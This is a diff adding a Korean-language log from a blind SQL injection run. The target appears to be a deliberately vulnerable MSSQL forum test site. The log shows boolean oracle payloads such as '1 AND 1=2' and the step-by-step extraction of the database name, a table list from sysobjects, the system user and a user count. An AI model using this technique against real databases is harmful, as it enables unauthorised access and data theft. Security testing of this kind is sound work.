@@ -1,0 +1,21 @@
+### 오라클 사전 확인
+  TRUE  (1 AND 1=1)  -> True
+  FALSE (1 AND 1=2)  -> False
+  MSSQL 식별 LEN()   -> True
+
+### 추출 1: DB_NAME()
+  [DB_NAME()] len=8  value = 'acuforum'   (누적 요청 67)
+
+### 추출 2: @@VERSION (앞 60자)
+  [@@VERSION] 길이 판별 실패(응답이 계속 거짓) — expr: @@version
+
+### 추출 3: 사용자 테이블 목록 (sysobjects)
+  [tables] len=27  value = 'forums,posts,threads,users,'   (누적 요청 343)
+
+### 추출 4: 현재 DB 사용자/시스템 계정
+  [SYSTEM_USER] len=8  value = 'acunetix'   (누적 요청 407)
+
+### 추출 5: DB 내 사용자 이름 목록 (forum users 테이블 추정)
+  [COUNT(*) FROM users] len=4  value = '1758'   (누적 요청 439)
+
+### 총 요청 수: 439
